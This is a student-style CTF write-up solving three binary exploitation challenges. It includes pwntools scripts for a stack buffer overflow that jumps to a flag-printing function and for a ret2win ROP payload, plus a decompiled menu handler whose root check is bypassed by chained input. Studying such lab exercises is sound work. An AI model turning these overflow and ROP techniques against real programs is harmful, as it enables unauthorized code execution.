# 1. Performative
> README.md
- Steps to launch:
	To build and start.

		- First `cd` into the `src` directory. Then run:

```bash
docker-compose up --build -d
```

		Connect to the challenge with:
```
nc localhost 1337 (For me it was 5000)
```
	
		After solving locally, connect to the challenge with:
```
nc performative.nitephase.live 56743
```

## Solve:
- First I launched the challenge locally and was shown this
```zsh
sparsh@archlinux ~/ctf/performative/src $ ./perf
### Welcome to the performative male/female parade! ###

Yk what performative people like? just a plain ol' bof!

Lets just generate a buffer then ig?

Buffer:
```
- The first thing I wanted to do was to check the buffer limit, as no source code was provided, I could either check with `gdb` or just trial and error.
- After a few trial and error attempts I could see that the program threw a segment violation after a size of 40 characters.
```zsh
sparsh@archlinux ~/ctf/performative/src $ ./perf
### Welcome to the performative male/female parade! ###

Yk what performative people like? just a plain ol' bof!

Lets just generate a buffer then ig?

Buffer: 1234567890123456789012345678901234567890
Generating your buffer...

Your custom buffer:
========================
1234567890123456789012345678901234567890
[1]    332622 segmentation fault (core dumped)  ./perf
```
- After this I checked the `objdump` of the binary and was able to find three functions of use which were `main`, `printFlag` and `win` on the address `0x4012db`,  `0x4011e9` and `0x401275` respectively.
- Having done a similar challenge before, I could incur that adding the address of a function at the end of a buffer overflow can trick the program into running that function.
- So for that I created a small python script to connect to the local instance first.
```python
from pwn import * 

nc = remote('localhost', 5000)

print(nc.recvline())

sendpayload = b'1'*40 + p64(0x4011e9)

nc.sendline(sendpayload)
nc.recvuntil(b':')


for i in range(6): 
    print(nc.recvline())

nc.close()

```
- This resulted in the following-
```zsh
sparsh@archlinux ~/ctf/performative/src $ python3 solve.py
[+] Opening connection to localhost on port 5000: Done
b'### Welcome to the performative male/female parade! ###\n'
b' Generating your buffer...\n'
b'\n'
b'Your custom buffer:\n'
b'========================\n'
b'1111111111111111111111111111111111111111\xe9\x11@\n'
b'nite{fake_flag}\n'
[*] Closed connection to localhost port 5000
```
- And through that I could get the content of `flag.txt`
- Now changing the port to the actual port
```python
from pwn import * 

nc = remote('performative.nitephase.live', 56743)

print(nc.recvline())

sendpayload = b'1'*40 + p64(0x4011e9)

nc.sendline(sendpayload)
nc.recvuntil(b':')


for i in range(6): 
    print(nc.recvline())

nc.close()
```
- And through that I got the actual flag.
```zsh
sparsh@archlinux ~/ctf/performative/src $ python3 solve.py
[┬] Opening connection to performative.nitephase.live on port 56743: Trying 4[+] Opening connection to performative.nitephase.live on port 56743: Done
b'### Welcome to the performative male/female parade! ###\n'
b' Generating your buffer...\n'
b'\n'
b'Your custom buffer:\n'
b'========================\n'
b'1111111111111111111111111111111111111111\xe9\x11@\n'
b'nite{th3_ch4l_4uth0r_15_4nt1_p3rf0rm4t1v3}\n'
[*] Closed connection to performative.nitephase.live port 56743
```

## Flag:
```c
nite{th3_ch4l_4uth0r_15_4nt1_p3rf0rm4t1v3}
```

## Notes and Concepts Learnt:
- Practice of scripting

# 2. Property In Manipal
>one executable is provided called `manipal`

## Solve:
- First using the `checksec` on the executable command I got this output
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	 Fortifiable	 FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   35 Symbols	  No	0	 	 3	 	 manipal
```
- Here since `NX` is enabled, we cannot run shell code on the stack and the heap
- Also here PIE was disabled and no stack canary was found.
- And also having fortify disabled meant that functions like `gets` and `strcpy` are also unsafe
- After searching around the bit on the internet regarding this combination, I got to know that in problems like these, the thing used is `ROP` which is `Return Oriented Programming`
	- It’s a technique attackers use when they cannot execute their own shellcode (because of **NX protection**), but they can control the return address on the stack.
- Looking at the video by `liveoverflows`, I could understand the method and created this script to complete this challenge.
- All the addresses I got using `objdump` and used `gdb` to get their addresses.
```
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  putchar@plt
0x0000000000401040  puts@plt
0x0000000000401050  system@plt
0x0000000000401060  printf@plt
0x0000000000401070  read@plt
0x0000000000401080  gets@plt
0x0000000000401090  fflush@plt
0x00000000004010a0  setvbuf@plt
0x00000000004010b0  _start
0x00000000004010e0  _dl_relocate_static_pie
0x0000000000401196  win
0x00000000004011ac  vuln
0x000000000040124e  main
0x00000000004012cc  _fini
```
- The offset could be easily calculated using `gdb-pwndbug`.
- This was the script I created:
```python
from pwn import *

nc = remote('propertyinmanipal.nitephase.live', 42586)

vuln = p64(0x4011ac)
win = p64(0x401196)
main = p64(0x40124e)

ret_addr = p64(0x040117f)

payload = b"A"*72 + ret_addr + win

nc.sendlineafter(b'Enter your name to signup for the property:', b'something')

nc.sendlineafter(b'Enter the amount for customizations', payload)

nc.interactive()
```
- This was the output I got which had the flag:
```
thecosmic@fedora ~/Desktop/prop $ python3 solve.py
[+] Opening connection to propertyinmanipal.nitephase.live on port 42586: Done
[*] Switching to interactive mode
: nite{ch0pp3d_ch1n_r34lly_m4d3_2025_p34k_f0r_u5}

[*] Got EOF while reading in interactive
```

## Flag:
```
 nite{ch0pp3d_ch1n_r34lly_m4d3_2025_p34k_f0r_u5}
```

## Notes and Concepts Learnt:
- I learnt how to attack using `ROP`
- I learnt how is `ROP` used.

# 3. Imma Dev

> An executable file was provided

## Solve:
- First I tried to run the program
```bash
thecosmic@fedora ~/Desktop/immadev/src $ ./immaDeveloper
Hi I'm sudonymouse!
I'm learning development, checkout this binary!
Option 1: Hello <USER>
Option 2: Flag(maybe?)
Option 3: Log into my binary!
2
Error: Option 2 requires root privileges HAHA
thecosmic@fedora ~/Desktop/immadev/src $ ./immaDeveloper
Hi I'm sudonymouse!
I'm learning development, checkout this binary!
Option 1: Hello <USER>
Option 2: Flag(maybe?)
Option 3: Log into my binary!
1
Input your name: s
Hi s
thecosmic@fedora ~/Desktop/immadev/src $ ./immaDeveloper
Hi I'm sudonymouse!
I'm learning development, checkout this binary!
Option 1: Hello <USER>
Option 2: Flag(maybe?)
Option 3: Log into my binary!
3
Input Username:
s
Enter Password:
s
lmeow i forgot to make the db
```
- This seemed to be unfruitful, I felt this was one of the programs in which you had input a specific option or a combination which prompted to the flag as it showed as one of the options in the `menu` like main of the program.
- So I decompiled the binary using `dogbolt` and exactly as my guess, the function that the binary uses to print and work these options looked to be exploitable
```c
void handleOption(void)

{
  int iVar1;
  bool bVar2;
  __uid_t _Var3;
  long *plVar4;
  ostream *poVar5;
  long in_FS_OFFSET;
  int local_5d4;
  int local_5d0;
  int local_5cc;
  string local_5c8 [32];
  istringstream local_5a8 [384];
  int local_428 [258];
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  local_5d0 = 0;
  std::string::string(local_5c8);
                    // try { // try from 001024a2 to 001024c4 has its CatchHandler @ 00102698
  std::getline<char,std::char_traits<char>,std::allocator<char>>((istream *)std::cin,local_5c8);
  std::istringstream::istringstream(local_5a8,local_5c8,8);
  while( true ) {
    plVar4 = (long *)std::istream::operator>>((istream *)local_5a8,&local_5d4);
    bVar2 = std::ios::operator_cast_to_bool((ios *)((long)plVar4 + *(long *)(*plVar4 + -0x18)));
    if ((bVar2) && (local_5d0 < 0x100)) {
      bVar2 = true;
    }
    else {
      bVar2 = false;
    }
    if (!bVar2) break;
    if ((local_5d4 < 1) || (3 < local_5d4)) {
                    // try { // try from 001024f0 to 00102625 has its CatchHandler @ 00102684
      poVar5 = std::operator<<((ostream *)std::cout,"Ignoring invalid option: ");
      poVar5 = (ostream *)std::ostream::operator<<(poVar5,local_5d4);
      std::ostream::operator<<(poVar5,std::endl<char,std::char_traits<char>>);
    }
    else {
      local_428[local_5d0] = local_5d4;
      local_5d0 = local_5d0 + 1;
    }
  }
  if ((local_428[0] == 2) && (_Var3 = geteuid(), _Var3 != 0)) {
    bVar2 = true;
  }
  else {
    bVar2 = false;
  }
  if (bVar2) {
    poVar5 = std::operator<<((ostream *)std::cout,"Error: Option 2 requires root privileges HAHA");
    std::ostream::operator<<(poVar5,std::endl<char,std::char_traits<char>>);
  }
  else {
    for (local_5cc = 0; local_5cc < local_5d0; local_5cc = local_5cc + 1) {
      iVar1 = local_428[local_5cc];
      if (iVar1 == 3) {
        login();
      }
      else if (iVar1 < 4) {
        if (iVar1 == 1) {
          sayHello();
        }
        else if (iVar1 == 2) {
          printFlag();
        }
      }
    }
  }
  std::istringstream::~istringstream(local_5a8);
  std::string::~string(local_5c8);
  if (local_20 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    // WARNING: Subroutine does not return
  __stack_chk_fail();
}
```
	 In one the else statements, It could be seen that the printFlag() function was called
-  Specifically this section here
```c
 if (bVar2) {
    poVar5 = std::operator<<((ostream *)std::cout,"Error: Option 2 requires root privileges HAHA");
    std::ostream::operator<<(poVar5,std::endl<char,std::char_traits<char>>);
  }
  else {
    for (local_5cc = 0; local_5cc < local_5d0; local_5cc = local_5cc + 1) {
      iVar1 = local_428[local_5cc];
      if (iVar1 == 3) {
        login();
      }
      else if (iVar1 < 4) {
        if (iVar1 == 1) {
          sayHello();
        }
        else if (iVar1 == 2) {
          printFlag();
        }
      }
    }
  }
```
- To get the flag, first we had to make sure that the variable `bvar2` is false, that could be done by running the sayHello() function and then `ivar1` had to be `2`
- To achieve this, we had to input `1 2` at the same time when it asked us to choose which function or command to use
- Using that, I got the following output on the `nc` port provided
```bash
thecosmic@fedora ~/Desktop/immadev/src $ nc immadeveloper.nitephase.live 61234
Hi I'm sudonymouse!
I'm learning development, checkout this binary!
Option 1: Hello <USER>
Option 2: Flag(maybe?)
Option 3: Log into my binary!
1 2
Input your name: sparsh
Hi sparsh
nite{n0t_4ll_b1n3x_15_st4ck_b4s3d!}
```

## Flag:
```
nite{n0t_4ll_b1n3x_15_st4ck_b4s3d!}
```

## Notes and Concepts Learnt:
- Challenges like these can be easily understood and solved using `ghidra`, from next challenge on wards, it is more advisable to use that.